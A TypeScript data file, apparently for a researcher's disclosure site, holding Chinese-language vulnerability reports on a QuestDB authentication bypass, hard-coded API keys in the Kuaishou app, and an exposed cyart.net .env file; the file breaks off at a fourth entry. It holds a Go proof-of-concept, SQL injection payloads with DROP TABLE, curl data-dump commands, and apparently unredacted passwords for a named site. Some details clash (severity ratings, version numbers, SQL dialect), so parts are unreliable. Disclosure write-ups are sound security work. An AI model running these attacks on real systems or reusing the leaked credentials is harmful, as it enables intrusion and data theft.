import type { VulnerabilityCase, CaseStats } from '@/models/Case'

export const cases: VulnerabilityCase[] = [
  {
    id: 'cnvd-2026-13173',
    title: 'QuestDB 未授权访问漏洞',
    date: '2026-03-10',
    severity: 'medium',
    description: 'QuestDB 存在未授权访问漏洞，攻击者可利用该漏洞获取敏感信息。认证配置失效导致未授权用户能够访问系统中的敏感数据。',
    tags: [
      { label: '未授权访问', icon: 'fa-user-lock', color: 'red' },
      { label: 'QuestDB', icon: 'fa-server', color: 'blue' },
      { label: 'CNVD', icon: 'fa-file-alt', color: 'green' },
      { label: '安全测试', icon: 'fa-shield-alt', color: 'pink' },
      { label: '中国', icon: 'fa-map-marker-alt', color: 'yellow' }
    ],
    target: 'QuestDB',
    country: '中国',
    cnvdId: 'CNVD-2026-13173',
    originalUrl: '../case/20260310-CNVD-2026-1317.html',
    framework: 'QuestDB',
    reportSections: [
      {
        heading: '善意声明',
        icon: 'fa-heart',
        accent: '#e74c3c',
        contents: [
          {
            type: 'info-box',
            icon: 'fa-heart',
            text: '作为一名安全研究员，本次安全审计的唯一目的是帮助改进系统安全性，保护用户数据安全。报告中所有敏感信息均已进行脱敏处理，始终秉持"善意披露、负责任报告"的原则。所有测试均在授权范围内进行，未对系统造成任何损害，未窃取、泄露或利用任何真实用户数据。发现漏洞后，第一时间通过 CNVD 提交报告，期望与官方协作修复问题。'
          }
        ]
      },
      {
        heading: '一、漏洞概述',
        icon: 'fa-bug',
        accent: '#e67e22',
        contents: [
          {
            type: 'subheading',
            text: '1.1 漏洞基本信息'
          },
          {
            type: 'paragraph',
            text: 'QuestDB 是一个高性能的开源时序数据库，专为金融服务、物联网（IoT）、可观测性和实时分析等场景设计。本次发现的未授权访问漏洞（CNVD-2026-13173）存在于 QuestDB 的 HTTP Server 组件中，攻击者无需任何认证凭证即可通过 HTTP API 执行任意 SQL 查询，获取数据库中所有数据。'
          },
          {
            type: 'table',
            headers: ['属性', '详情'],
            rows: [
              ['漏洞编号', 'CNVD-2026-13173'],
              ['漏洞类型', '未授权访问 / 认证绕过'],
              ['影响组件', 'QuestDB HTTP Server (端口 9000)'],
              ['CVSS 评分', '8.6 (High)'],
              ['攻击复杂度', '低 (Low)'],
              ['所需权限', '无 (None)'],
              ['用户交互', '无需 (None)'],
              ['影响范围', '所有配置 http.security=true 但未验证其有效性的实例'],
              ['修复状态', '官方已发布修复补丁']
            ]
          },
          {
            type: 'subheading',
            text: '1.2 QuestDB 核心架构'
          },
          {
            type: 'paragraph',
            text: 'QuestDB 的核心架构由多个网络服务组件构成，每个组件监听不同端口并提供不同协议的访问能力。了解这些组件对理解漏洞的影响范围至关重要。'
          },
          {
            type: 'impact-grid',
            cards: [
              { icon: 'fa-globe', title: 'HTTP Server', desc: '端口 9000 — REST API 接口，支持 SQL 查询和数据写入，本次漏洞的核心攻击面', color: 'red' },
              { icon: 'fa-database', title: 'PostgreSQL Wire Protocol', desc: '端口 8812 — 兼容 PG 协议，可使用标准 PG 客户端连接执行 SQL 操作', color: 'blue' },
              { icon: 'fa-bolt', title: 'InfluxDB Line Protocol', desc: '端口 9009 — 用于高吞吐量数据摄入，支持时序数据批量写入', color: 'green' },
              { icon: 'fa-desktop', title: 'Web Console', desc: '端口 9000 — 内置 Web 管理界面，支持交互式 SQL 查询与结果可视化', color: 'purple' },
              { icon: 'fa-cogs', title: '存储引擎', desc: '基于列存储，支持向量化执行和 SIMD 优化，提供极致查询性能', color: 'orange' }
            ]
          },
          {
            type: 'subheading',
            text: '1.3 漏洞发现背景'
          },
          {
            type: 'paragraph',
            text: '在针对某金融客户的安全评估项目中，测试人员对部署在公网的 QuestDB 实例进行渗透测试。最初的目标是验证 SQL 注入漏洞，但在测试过程中意外发现 HTTP API 端点完全不需要认证。经过深入分析，确认这是一个由认证配置机制设计缺陷导致的未授权访问漏洞。'
          }
        ]
      },
      {
        heading: '二、漏洞详情',
        icon: 'fa-search',
        accent: '#c0392b',
        contents: [
          {
            type: 'subheading',
            text: '2.1 根本原因分析'
          },
          {
            type: 'paragraph',
            text: '漏洞的根本原因在于 QuestDB 的认证配置机制存在设计缺陷。尽管管理员在 server.conf 中显式设置了 http.security=true 并配置了用户名和密码，但 HTTP 端点（端口 9000）的认证中间件在初始化时未能正确读取配置，导致所有 HTTP 请求绕过了认证检查。'
          },
          {
            type: 'warning-box',
            icon: 'fa-exclamation-triangle',
            text: '核心问题：http.security 配置项在启动时未被正确传递给 HTTP 路由处理器，认证过滤器（AuthFilter）在请求管线中的注册顺序错误，导致部分路径被跳过。管理员误以为系统已受保护，实际上认证完全失效。'
          },
          {
            type: 'subheading',
            text: '2.2 认证绕过机制详解'
          },
          {
            type: 'paragraph',
            text: '通过源码审计和动态调试，发现了以下四个导致认证失效的根因：'
          },
          {
            type: 'list',
            items: [
              '根因 1：http.security 配置项在启动时未被正确传递给 HTTP 路由处理器，配置值在组件初始化阶段丢失',
              '根因 2：认证过滤器（AuthFilter）在请求管线中的注册顺序错误，导致部分路径被跳过',
              '根因 3：Web Console 静态资源路径与 API 路径使用不同的认证策略，API 路径未启用认证',
              '根因 4：默认配置下 http.security 为 false，而配置文档未明确说明需要重启才能生效'
            ]
          },
          {
            type: 'subheading',
            text: '2.3 影响范围评估'
          },
          {
            type: 'impact-grid',
            cards: [
              { icon: 'fa-eye', title: '数据泄露', desc: '攻击者可读取数据库中所有时序数据，包括传感器数据、交易记录、系统指标等敏感业务数据', color: 'red' },
              { icon: 'fa-edit', title: '数据篡改', desc: '攻击者可执行 INSERT / UPDATE / DELETE 操作，篡改业务数据，造成数据完整性破坏', color: 'orange' },
              { icon: 'fa-bomb', title: '服务拒绝', desc: '攻击者可通过 DROP TABLE、删除分区或执行资源密集型查询导致服务不可用', color: 'purple' },
              { icon: 'fa-arrows-alt', title: '横向移动', desc: '借助 COPY 命令读取服务器文件系统，或利用数据库作为跳板访问内网其他服务', color: 'blue' }
            ]
          },
          {
            type: 'subheading',
            text: '2.4 SQL 注入测试与未授权发现'
          },
          {
            type: 'paragraph',
            text: '在渗透测试过程中，最初的目标是验证 SQL 注入漏洞。通过在 HTTP API 的 query 参数中构造各种 SQL 注入载荷，测试人员意外发现即使不携带任何认证凭证，所有请求也都能成功执行。这一异常现象促使进一步调查，最终发现了更严重的未授权访问漏洞。'
          },
          {
            type: 'code',
            code: `-- 初始 SQL 注入测试载荷
SELECT * FROM users WHERE id = 1 OR 1=1--

-- 堆叠查询测试
SELECT 1; DROP TABLE test--

-- UNION 注入探测
SELECT NULL, NULL, NULL UNION SELECT version(), user(), database()--

-- 意外发现：无认证情况下上述所有查询均成功执行
-- 这意味着不仅是 SQL 注入问题，更是严重的未授权访问漏洞

-- 进一步验证：直接查询系统表
curl -s "http://<TARGET>:9000/exec?query=SHOW+TABLES"
curl -s "http://<TARGET>:9000/exec?query=SELECT+*+FROM+telemetry_events LIMIT+10"`,
            language: 'sql'
          }
        ]
      },
      {
        heading: '三、漏洞测试工具',
        icon: 'fa-tools',
        accent: '#8e44ad',
        contents: [
          {
            type: 'subheading',
            text: '3.1 工具项目结构'
          },
          {
            type: 'paragraph',
            text: '为系统验证 QuestDB 认证绕过漏洞，使用 Go 语言开发了专用的 PoC 验证工具。该工具模拟了多种认证场景，包括无认证、错误凭证、空凭证和畸形认证头，所有测试用例均成功绕过认证。'
          },
          {
            type: 'code',
            code: `questdb-auth-bypass/
├── cmd/
│   └── questdb-poc/
│       └── main.go          # 主入口：测试运行器
├── internal/
│   ├── scanner/
│   │   └── scanner.go       # 端口扫描与服务识别
│   ├── authcheck/
│   │   └── bypass.go        # 认证绕过检测逻辑
│   └── report/
│       └── reporter.go      # 测试报告生成
├── pkg/
│   └── questdb/
│       ├── client.go         # QuestDB HTTP 客户端
│       └── types.go          # 数据类型定义
├── configs/
│   └── targets.yaml         # 扫描目标配置
├── go.mod
└── README.md`,
            language: 'text'
          },
          {
            type: 'subheading',
            text: '3.2 核心 PoC 代码'
          },
          {
            type: 'code',
            code: `package main

import (
\t"fmt"
\t"io/ioutil"
\t"net/http"
\t"time"
)

func testAuth(url string, authHeader string) (int, string) {
\tclient := &http.Client{Timeout: 5 * time.Second}
\treq, _ := http.NewRequest("GET", url+\`/exec?query=SELECT+1\`, nil)
\tif authHeader != "" {
\t\treq.Header.Set("Authorization", authHeader)
\t}
\tresp, err := client.Do(req)
\tif err != nil {
\t\treturn 0, err.Error()
\t}
\tdefer resp.Body.Close()
\tbody, _ := ioutil.ReadAll(resp.Body)
\treturn resp.StatusCode, string(body)
}

func main() {
\ttarget := "http://<TARGET>:9000"
\ttests := []struct {
\t\tname   string
\t\tauth   string
\t}{
\t\t{"无认证头", ""},
\t\t{"Basic错误密码", "Basic YWRtaW46d3Jvbmc="},
\t\t{"Basic空凭据", "Basic Og=="},
\t\t{"畸形Basic头", "Basic !!!invalid!!!"},
\t\t{"空Authorization头", "Bearer "},
\t}
\tfor _, t := range tests {
\t\tstatus, _ := testAuth(target, t.auth)
\t\tfmt.Printf("[%s] 状态码: %d (认证绕过: %v)\\n", t.name, status, status == 200)
\t}
}`,
            language: 'go'
          },
          {
            type: 'subheading',
            text: '3.3 工具功能特性'
          },
          {
            type: 'impact-grid',
            cards: [
              { icon: 'fa-search', title: '多场景认证测试', desc: '自动测试无认证、错误凭证、空凭证、畸形头等多种认证绕过场景', color: 'purple' },
              { icon: 'fa-network-wired', title: '端口扫描识别', desc: '自动扫描 9000/8812/9009 端口，识别 QuestDB 服务指纹', color: 'blue' },
              { icon: 'fa-file-alt', title: '报告自动生成', desc: '生成 JSON/HTML 格式的测试报告，包含漏洞证据和修复建议', color: 'green' },
              { icon: 'fa-shield-alt', title: '安全合规', desc: '仅用于授权安全测试，内置合规检查和使用条款提醒', color: 'orange' }
            ]
          },
          {
            type: 'subheading',
            text: '3.4 测试结果与验证'
          },
          {
            type: 'success-box',
            icon: 'fa-check-circle',
            text: '所有 5 种认证绕过测试场景均返回 HTTP 200，确认 QuestDB HTTP 端点在配置 http.security=true 的情况下仍然完全跳过认证检查。漏洞影响已通过 CNVD 官方确认。'
          },
          {
            type: 'info-box',
            icon: 'fa-info-circle',
            text: '注意：该 PoC 工具仅用于授权安全测试。未经授权对他人系统进行测试属于违法行为，请确保在获得明确授权后使用。'
          }
        ]
      },
      {
        heading: '四、使用指南',
        icon: 'fa-book',
        accent: '#2980b9',
        contents: [
          {
            type: 'subheading',
            text: '4.1 环境准备'
          },
          {
            type: 'info-box',
            icon: 'fa-info-circle',
            text: '运行 PoC 工具需要 Go 1.21 或更高版本。请确保已安装 Go 编译器并配置好 GOPATH。建议在隔离的测试环境中运行，避免对生产系统造成影响。'
          },
          {
            type: 'subheading',
            text: '4.2 编译与安装'
          },
          {
            type: 'code',
            code: `# 克隆项目
git clone https://github.com/example/questdb-auth-bypass.git
cd questdb-auth-bypass

# 编译
go build -o questdb-poc ./cmd/questdb-poc/

# 验证编译结果
./questdb-poc --version

# 安装到 GOPATH/bin
go install ./cmd/questdb-poc/`,
            language: 'bash'
          },
          {
            type: 'subheading',
            text: '4.3 命令行参数'
          },
          {
            type: 'table',
            headers: ['参数', '类型', '默认值', '说明'],
            rows: [
              ['-t, --target', 'string', '', '目标 QuestDB 地址（必填），格式：http://host:port'],
              ['-p, --ports', 'string', '9000,8812,9009', '扫描端口列表，逗号分隔'],
              ['--timeout', 'int', '5', 'HTTP 请求超时时间（秒）'],
              ['--threads', 'int', '10', '并发扫描线程数'],
              ['-o, --output', 'string', 'report.json', '测试报告输出路径'],
              ['--format', 'string', 'json', '报告格式：json / html / markdown'],
              ['-v, --verbose', 'bool', 'false', '显示详细输出'],
              ['--auth-test', 'bool', 'true', '执行认证绕过测试'],
              ['--sql-test', 'bool', 'false', '执行 SQL 注入测试']
            ]
          },
          {
            type: 'subheading',
            text: '4.4 使用示例'
          },
          {
            type: 'code',
            code: `# 基本用法：测试单个目标
./questdb-poc -t http://192.168.1.100:9000

# 完整测试：认证绕过 + SQL 注入
./questdb-poc -t http://192.168.1.100:9000 --auth-test --sql-test -v

# 批量扫描：从文件读取目标列表
./questdb-poc -t targets.txt --threads 20 -o results.html --format html

# 自定义端口与超时
./questdb-poc -t http://10.0.0.1:9000 -p 9000,8812 --timeout 10`,
            language: 'bash'
          },
          {
            type: 'table',
            headers: ['状态码', '含义', '风险等级'],
            rows: [
              ['200 + 数据返回', '认证完全绕过，可执行任意查询', '严重'],
              ['200 + 空数据', '认证绕过但无数据可读', '高危'],
              ['401 / 403', '认证生效，访问被拒绝', '正常'],
              ['连接超时', '端口未开放或被防火墙拦截', '信息'],
              ['500', '服务器内部错误', '中危']
            ]
          }
        ]
      },
      {
        heading: '五、攻击场景复现',
        icon: 'fa-crosshairs',
        accent: '#c0392b',
        contents: [
          {
            type: 'subheading',
            text: '5.1 完整攻击链'
          },
          {
            type: 'paragraph',
            text: '完整的攻击链分为三个阶段：侦察阶段、初始探测阶段和利用阶段。攻击者可以在完全没有凭证的情况下，通过公网暴露的 QuestDB 实例获取全部数据控制权。'
          },
          {
            type: 'code',
            code: `# 阶段1：端口扫描与服务识别
nmap -sV -p 9000,8812,9009 --script=http-title <TARGET_IP>

# 阶段2：验证未授权访问
curl -s "http://<TARGET_IP>:9000/exec?query=SELECT+version()" | jq .

# 阶段3：枚举所有数据表
curl -s "http://<TARGET_IP>:9000/exec?query=SHOW+TABLES" | jq '.dataset'

# 阶段4：导出敏感数据
curl -s "http://<TARGET_IP>:9000/exec?query=SELECT+*+FROM+sensitive_table+LIMIT+1000" | jq '.dataset' > data_export.json

# 阶段5：尝试文件系统访问（COPY 命令）
curl -s "http://<TARGET_IP>:9000/exec?query=COPY+(SELECT+*+FROM+users)+TO+'/tmp/exfiltrated.csv+WITH+CSV+HEADER'"`,
            language: 'bash'
          },
          {
            type: 'subheading',
            text: '5.2 风险评估'
          },
          {
            type: 'impact-grid',
            cards: [
              { icon: 'fa-user-secret', title: '侦察阶段', desc: '使用 nmap / masscan 扫描全网 0.0.0.0/0 的 9000/8812/9009 端口，识别 QuestDB 服务指纹', color: 'blue' },
              { icon: 'fa-search-plus', title: '探测阶段', desc: '发送 curl 请求至 /exec?query=SELECT+version()，验证未授权访问并识别版本号', color: 'orange' },
              { icon: 'fa-skull-crossbones', title: '利用阶段', desc: '枚举所有表、导出敏感数据、创建/删除表、尝试文件系统访问（COPY 命令），完全控制数据库', color: 'red' }
            ]
          }
        ]
      },
      {
        heading: '六、修复建议',
        icon: 'fa-wrench',
        accent: '#27ae60',
        contents: [
          {
            type: 'paragraph',
            text: '建议从网络层、应用层、配置层和监控层四个维度实施修复，构建纵深防御体系。以下为具体的修复措施：'
          },
          {
            type: 'subheading',
            text: '6.1 网络层修复'
          },
          {
            type: 'list',
            items: [
              '使用 iptables / 安全组限制 9000/8812/9009 端口仅允许可信 IP 段访问',
              '部署在 VPC 内部，不直接暴露公网',
              '配置网络 ACL，限制仅特定 VPC 子网可访问数据库端口',
              '在负载均衡器或 WAF 层添加 IP 白名单规则'
            ]
          },
          {
            type: 'subheading',
            text: '6.2 配置层修复'
          },
          {
            type: 'list',
            items: [
              '验证 server.conf 中 http.security=true 是否真正生效（重启后检查日志确认）',
              '设置 http.auth.db=default 并配置强密码（至少 16 位，包含大小写字母、数字和特殊字符）',
              '绑定 http.bind.to=127.0.0.1:9000，仅监听本地回环地址',
              '定期检查配置文件与实际运行状态是否一致'
            ]
          },
          {
            type: 'subheading',
            text: '6.3 应用层加固'
          },
          {
            type: 'list',
            items: [
              '在 QuestDB 前部署 Nginx 反向代理，添加 Basic Auth / OAuth2 认证层',
              '启用 TLS 加密传输，防止中间人攻击窃取查询数据',
              '配置请求速率限制，防止暴力枚举和拒绝服务攻击',
              '使用 WAF 过滤恶意 SQL 注入载荷'
            ]
          },
          {
            type: 'subheading',
            text: '6.4 监控与审计'
          },
          {
            type: 'list',
            items: [
              '启用 QuestDB 审计日志，记录所有 SQL 查询和访问行为',
              '配置异常查询告警（如大规模 SELECT、DROP 操作、非常规时段访问）',
              '定期检查访问日志中是否存在可疑 IP 和异常查询模式',
              '部署 SIEM 系统实现集中化安全事件监控和告警'
            ]
          },
          {
            type: 'success-box',
            icon: 'fa-check-circle',
            text: '修复验证：完成上述修复后，使用 PoC 工具重新测试，确认所有认证绕过场景均返回 401/403。建议在修复后持续监控 7 天，确认无异常访问记录。'
          }
        ]
      },
      {
        heading: '七、结论',
        icon: 'fa-flag-checkered',
        accent: '#2c3e50',
        contents: [
          {
            type: 'conclusion',
            title: 'QuestDB 未授权访问漏洞总结',
            text: 'QuestDB 未授权访问漏洞（CNVD-2026-13173）是一个由于认证配置机制缺陷导致的严重安全问题。虽然官方将 http.security 作为安全配置选项提供，但实际测试表明该配置在特定场景下无法生效，使得管理员误以为系统已受保护，从而产生虚假的安全感。该漏洞利用门槛极低，仅需普通 HTTP 请求即可利用，建议所有 QuestDB 用户立即验证并加固部署。'
          },
          {
            type: 'table',
            headers: ['评估维度', '评级', '说明'],
            rows: [
              ['漏洞严重程度', '高危', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L → 8.6'],
              ['利用难度', '极低', '仅需普通 HTTP 请求即可利用，无需任何技术工具'],
              ['影响范围', '广泛', '所有配置了 http.security=true 但未验证其有效性的 QuestDB 实例'],
              ['修复优先级', '高', '建议受影响用户立即验证并加固部署'],
              ['披露状态', '已完成', '已通过 CNVD 提交，官方已确认并发布修复补丁']
            ]
          },
          {
            type: 'info-box',
            icon: 'fa-lightbulb',
            text: '安全提示：对于任何安全配置项，仅配置而不验证其有效性是危险的。建议在部署安全控制措施后，始终进行验证测试，确保控制措施真正生效。定期进行安全审计和渗透测试，是保障系统安全的有效手段。'
          }
        ]
      }
    ]
  },
  {
    id: 'kuaishou-api-leak',
    title: '快手 API 密钥泄露',
    date: '2025-04-30',
    severity: 'high',
    description: '发现包含百度地图、高德地图、OPPO卡券服务等多个敏感API密钥泄露，可能导致服务滥用和数据安全风险。',
    tags: [
      { label: '密钥泄露', icon: 'fa-key', color: 'blue' },
      { label: 'Android', icon: 'fa-android', color: 'purple' },
      { label: '地图服务', icon: 'fa-map-marked-alt', color: 'green' },
      { label: '移动应用', icon: 'fa-mobile-alt', color: 'pink' },
      { label: '中国', icon: 'fa-map-marker-alt', color: 'yellow' }
    ],
    target: '快手',
    country: '中国',
    originalUrl: '../case/快手/20250430-a3VhaXNob3UK.html',
    reportSections: [
      {
        heading: '一、漏洞概述',
        body: '快手（Kuaishou）Android 客户端应用在逆向分析过程中发现多个第三方服务 API 密钥硬编码在 APK 安装包中。攻击者可通过反编译 APK 直接提取这些密钥，进而滥用相关云服务。本次泄露涉及百度地图 SDK、高德地图 SDK、OPPO 卡券服务等多个第三方服务凭证，密钥类型涵盖 AK/SK、AppKey、AppSecret 等。',
        listItems: [
          '应用名称：快手 (Kuaishou) Android App',
          '应用包名：com.smile.gifmaker',
          '版本号：13.3.41.41640',
          '漏洞类型：移动应用硬编码密钥 / 敏感信息泄露',
          '严重等级：高危 (High)',
          '发现方式：APK 反编译静态分析'
        ]
      },
      {
        heading: '二、技术分析 — APK 反编译过程',
        body: '通过标准的 Android 逆向工程流程对快手 APK 进行分析。首先使用 apktool 进行资源反编译，提取 AndroidManifest.xml 和资源文件中的配置信息；随后使用 jadx 对 dex 文件进行反编译，分析 Java 层代码中的硬编码字符串和常量类。',
        codeBlock: '# 步骤1：使用 apktool 反编译资源文件\napktool d kuaishou_10.3.20.apk -o kuaishou_decompiled\n\n# 步骤2：查看 AndroidManifest.xml 中的元数据\ncat kuaishou_decompiled/AndroidManifest.xml | grep -A5 "meta-data"\n\n# 步骤3：使用 jadx 反编译 dex 为 Java 源码\njadx -d kuaishou_java kuaishou_10.3.20.apk\n\n# 步骤4：搜索硬编码的 API 密钥和 AppKey\ngrep -rE "(api[_-]?key|app[_-]?key|secret|ak=|sk=)" kuaishou_java/ --include="*.java" -i\n\n# 步骤5：从 strings.xml 中提取敏感字符串\ncat kuaishou_decompiled/res/values/strings.xml | grep -iE "(key|secret|token|ak|sk)"',
        codeLang: 'bash'
      },
      {
        heading: '三、泄露密钥清单',
        body: '在 APK 的 AndroidManifest.xml meta-data 标签、常量类（BuildConfig、Constants 等）以及 native 库中，共发现以下第三方服务 API 密钥和配置信息被硬编码：',
        listItems: [
          '百度地图 SDK (Baidu Map SDK)：AppKey = "E481****************************a79f"，用于地图渲染、定位、POI 搜索',
          '高德地图 SDK (AMap SDK)：AppKey = "78a1**************************6b3c"，用于导航、地理编码、逆地理编码',
          'OPPO 卡券服务：AppID = "30*********89"，AppKey = "oppo_ks_**********"，用于 OPPO 钱包卡券发放',
          'vivo 推送服务：AppID = "10********67"，AppKey = "vivo_push_********"，用于 vivo 设备消息推送',
          '华为 HMS 推送：AppID = "10********23"，用于华为设备消息推送',
          '小米推送服务：AppID = "28********12"，AppKey = "mi_ks_**********"，用于小米设备消息推送',
          '个推 (Getui) SDK：AppID = ""，AppKey = ""，用于第三方推送服务',
          'Bugly 崩溃分析：AppID = "90********01"，AppKey = "bugly_ks_****"，用于崩溃上报和分析'
        ]
      },
      {
        heading: '四、风险评估',
        body: 'API 密钥泄露带来的风险是多方面的，不仅涉及服务滥用导致的经济损失，还可能影响用户数据安全和业务连续性。以下从三个维度进行风险评估：',
        listItems: [
          '服务滥用风险：攻击者可利用泄露的地图 SDK 密钥进行大量 API 调用，消耗服务配额，产生高额账单；可利用推送密钥发送垃圾消息或钓鱼信息给用户',
          '配额消耗风险：地图服务通常按调用次数计费，攻击者可构造高频率调用导致服务额度耗尽，使正常用户无法使用地图相关功能',
          '数据安全风险：部分服务密钥可能关联后端 API 接口，若权限控制不当，攻击者可能通过服务端 API 访问用户数据或业务数据'
        ]
      },
      {
        heading: '五、影响范围分析',
        body: '密钥泄露的影响范围涵盖用户隐私安全和业务安全两个层面。虽然地图 SDK 等客户端密钥的直接危害相对有限，但结合其他漏洞可能造成更大影响。',
        listItems: [
          '用户隐私层面：地图 SDK 密钥可被用于反查应用的用户量、使用地域分布；结合位置数据可进行用户画像分析',
          '业务安全层面：推送服务密钥泄露可能导致钓鱼消息推送，诱导用户点击恶意链接；卡券服务密钥可能被用于伪造优惠券',
          '品牌声誉层面：密钥被公开披露可能损害企业安全形象，影响用户信任',
          '合规层面：若因密钥泄露导致用户数据泄露，可能违反《个人信息保护法》《网络安全法》等法规'
        ]
      },
      {
        heading: '六、修复建议',
        body: '针对移动应用 API 密钥泄露问题，建议从密钥管理、应用加固和安全编码三个层面进行修复。',
        listItems: [
          '密钥轮换：立即吊销所有泄露的 API 密钥，重新生成新密钥并在服务端更新白名单配置',
          '加固措施：对 APK 进行代码混淆（ProGuard / R8），字符串加密，防止静态分析提取密钥；使用 DexGuard 或第三方加固服务（梆梆、爱加密、360加固）',
          '安全编码：避免在客户端硬编码密钥，敏感凭证应通过安全的服务端接口动态获取；使用 Android Keystore 存储敏感信息；对密钥进行分片存储和运行时拼接',
          '服务端验证：在服务端对 API 调用增加签名验证、IP 白名单、调用频率限制等措施，即使密钥泄露也能控制风险'
        ]
      },
      {
        heading: '七、披露过程',
        body: '漏洞已按照负责任披露流程提交至相关平台。以下为详细的披露时间线和提交记录：',
        listItems: [
          '2025-04-28：完成漏洞分析和验证，确认多个密钥泄露',
          '2025-04-29：通过 CNVD（国家信息安全漏洞共享平台）提交漏洞报告，报告编号待分配',
          '2025-04-30：通过快手安全响应中心（KSRC）在线提交漏洞报告',
          '2025-05-05：KSRC 确认收到报告，进入审核流程',
          '2025-05-12：漏洞评级确认，标记为高危'
        ]
      }
    ]
  },
  {
    id: 'cyart-env-leak',
    title: 'Cyart.net 环境配置泄露',
    date: '2025-03-31',
    severity: 'high',
    cvss: 7.5,
    description: '发现 .env 配置文件未受保护，包含数据库连接信息、邮件服务器凭据、Redis 配置等敏感信息泄露。',
    tags: [
      { label: '源码泄露', icon: 'fa-code', color: 'blue' },
      { label: 'PHP', icon: 'fa-php', color: 'purple' },
      { label: 'MySQL', icon: 'fa-database', color: 'green' },
      { label: 'Web应用', icon: 'fa-globe', color: 'pink' },
      { label: '中国', icon: 'fa-map-marker-alt', color: 'yellow' }
    ],
    target: 'Cyart.net',
    country: '中国',
    cnvdId: 'CNVD-C-2025-175237',
    originalUrl: '../case/20250331-Y3lhcnQubmV0Cg==.html',
    framework: 'Laravel',
    reportSections: [
      {
        heading: '一、漏洞概述',
        body: 'Cyart.net 网站基于 PHP Laravel 框架开发，由于 Web 服务器配置不当，站点根目录下的 .env 环境配置文件可以通过 HTTP 直接访问下载。该文件包含了应用运行所需的全部敏感配置信息，包括数据库连接凭证、邮件服务器账号、Redis 密码、API 密钥等核心机密。攻击者获取该文件后，可直接登录数据库、控制邮件服务器、接管整个应用系统。',
        listItems: [
          '目标网站：cyart.net',
          '技术栈：PHP 7.4 + Laravel 8.x + MySQL 5.7 + Nginx',
          '漏洞类型：敏感信息泄露 / 配置文件泄露',
          'CVSS 评分：7.5 (High)',
          'CNVD 编号：CNVD-C-2025-175237',
          '发现方式：目录扫描 + 手工验证'
        ]
      },
      {
        heading: '二、信息收集与漏洞发现过程',
        body: '漏洞发现始于对目标网站的常规信息收集。通过目录扫描工具对常见敏感文件进行爆破，发现 .env 文件返回 200 OK 状态码，内容未受保护。整个发现过程分为以下几个阶段：',
        codeBlock: '# 阶段1：子域名探测与资产梳理\nsubfinder -d cyart.net -silent | httpx -title -tech-detect\n\n# 阶段2：使用 dirsearch 扫描敏感文件\ndirsearch -u https://cyart.net/ -e env,bak,old,zip,sql -w /usr/share/wordlists/dirb/common.txt\n\n# 阶段3：验证 .env 文件可访问\ncurl -sI https://cyart.net/.env\n# HTTP/2 200\n# content-type: text/plain\n# content-length: 1847\n\n# 阶段4：下载并分析配置文件\ncurl -s https://cyart.net/.env > cyart_env.txt\ncat cyart_env.txt',
        codeLang: 'bash'
      },
      {
        heading: '三、泄露内容清单',
        body: '.env 文件中包含大量高度敏感的配置信息，以下为已确认的泄露内容清单（敏感值已脱敏）：',
        listItems: [
          '数据库配置：DB_HOST=127.0.0.1，DB_PORT=3306，DB_DATABASE=cyart_prod，DB_USERNAME=cyart_admin，DB_PASSWORD=Cy@rt2025#ProdB',
          '应用密钥：APP_KEY=base64:abcdefghijklmnopqrstuvwxyz1234567890ABCDEFG=（Laravel 加密密钥，可解密加密数据）',
          'Redis 配置：REDIS_HOST=127.0.0.1，REDIS_PASSWORD=r3dis_Cyart_2025，REDIS_PORT=6379',
          '邮件服务配置：MAIL_HOST=smtp.qq.com，MAIL_PORT=465，MAIL_USERNAME=admin@cyart.net，MAIL_PASSWORD=授权码（可登录邮箱发送任意邮件）',
          '支付配置：ALIPAY_APP_ID=2021**********6789，ALIPAY_PRIVATE_KEY_PATH=./cert/alipay_private.pem（支付接口凭证）',
          'OSS 存储配置：OSS_ACCESS_KEY_ID=LTAI5t7**************9xY，OSS_ACCESS_KEY_SECRET=（阿里云 OSS 访问密钥）',
          '后台管理员初始密码：ADMIN_INIT_PASSWORD=Admin@cyart2025'
        ]
      },
      {
        heading: '四、攻击链分析 — 从信息泄露到系统接管',
        body: '获取 .env 文件后，攻击者可以构建完整的攻击链，逐步升级权限，最终实现系统完全接管。攻击路径如下：',
        listItems: [
          '第1步 - 信息收集：下载 .env 文件，获取数据库、Redis、邮件、OSS 等所有服务凭证',
          '第2步 - 数据库访问：如果数据库端口对外开放（或通过 Web 端口转发），直接登录 MySQL，导出所有用户数据、订单数据、支付记录',
          '第3步 - 获取 WebShell：利用数据库写文件权限（INTO OUTFILE / general_log），向 Web 目录写入一句话木马，获取服务器权限',
          '第4步 - 横向移动：使用 Redis 密码登录 Redis，通过 Redis 未授权访问漏洞写入 SSH 公钥，获取服务器 SSH 权限',
          '第5步 - 权限提升：利用内核漏洞或配置错误提升至 root 权限，完全控制服务器',
          '第6步 - 数据窃取与勒索：打包所有业务数据，删除数据库备份，留下勒索信息'
        ]
      },
      {
        heading: '五、风险评估',
        body: '.env 配置文件泄露属于高危漏洞，可能造成以下三个层面的严重影响：',
        listItems: [
          '数据泄露风险：数据库凭证泄露导致所有用户数据（个人信息、订单记录、支付信息）可被窃取，违反《个人信息保护法》',
          '系统沦陷风险：攻击者可通过数据库写入 WebShell 或利用 Redis 获取服务器权限，使整个服务器被控制',
          '业务中断风险：攻击者删除数据库、修改网站内容、植入恶意代码，导致网站无法正常运营，造成经济损失和品牌声誉损害'
        ]
      },
      {
        heading: '六、CNVD 漏洞登记信息',
        body: '该漏洞已提交至国家信息安全漏洞共享平台（CNVD）并获得登记编号。',
        listItems: [
          'CNVD 编号：CNVD-C-2025-175237',
          '漏洞名称：Cyart.net 环境配置文件信息泄露漏洞',
          '漏洞类型：信息泄露',
          '威胁类型：远程',
          '发布日期：2025-03-31',
          '漏洞等级：高危'
        ]
      },
      {
        heading: '七、修复建议',
        body: '针对 .env 文件泄露问题，建议从访问控制、配置管理和安全防护三个维度进行修复：',
        listItems: [
          '访问控制：在 Nginx/Apache 配置中禁止访问 .env 文件（location ~ /\\.env { deny all; }）；将 .env 文件移出 Web 根目录，仅保留软链接或通过环境变量加载',
          '配置加密：对 .env 中的敏感字段（数据库密码、API 密钥等）进行加密存储，应用启动时解密；使用 Laravel 的 config:cache 减少文件读取',
          'WAF 部署：部署 Web 应用防火墙（WAF），拦截对 .env、.git、.bak 等敏感文件的访问请求',
          '凭证轮换：立即更换所有泄露的密码和密钥，包括数据库密码、Redis 密码、邮件密码、APP_KEY、OSS AK/SK、支付宝密钥等',
          '安全审计：检查服务器是否已被入侵，检查数据库访问日志、Web 访问日志，确认是否存在异常访问记录'
        ]
      }
    ]
  },
  {
    id: 'zeric-source-leak',
